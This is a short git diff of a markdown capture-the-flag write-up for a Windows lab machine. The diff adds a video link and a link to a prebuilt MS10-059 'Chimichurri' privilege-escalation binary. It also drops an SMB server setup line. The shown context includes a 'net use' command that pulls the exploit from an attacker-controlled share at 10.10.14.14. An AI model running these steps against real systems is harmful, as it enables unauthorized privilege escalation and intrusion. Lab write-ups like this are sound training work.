@@ -6,6 +6,8 @@
 - **User**: `tolis`
 - **Root Method**: MS10-059 exploit via Chimichurri
 
+https://www.youtube.com/watch?v=Gfus5di2EF4
+
 ---
 
 ## 🔍 Reconnaissance
@@ -85,12 +87,11 @@ python3 windows-exploit-suggester.py --update
 python3 windows-exploit-suggester.py --database 2020-XX-XX-mssb.xls --systeminfo sysinfo.txt
 ```
 
-**Selected**: MS10-059 — Chimichurri
+**Selected**: [MS10-059.exe](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/MS10-059.exe)
 
 ### 📤 Transfer Exploit Binary
 ```bash
-# On Kali
-smbserver.py share .  # from impacket-scripts
+
 
 # On Arctic shell
 net use \\10.10.14.14\share
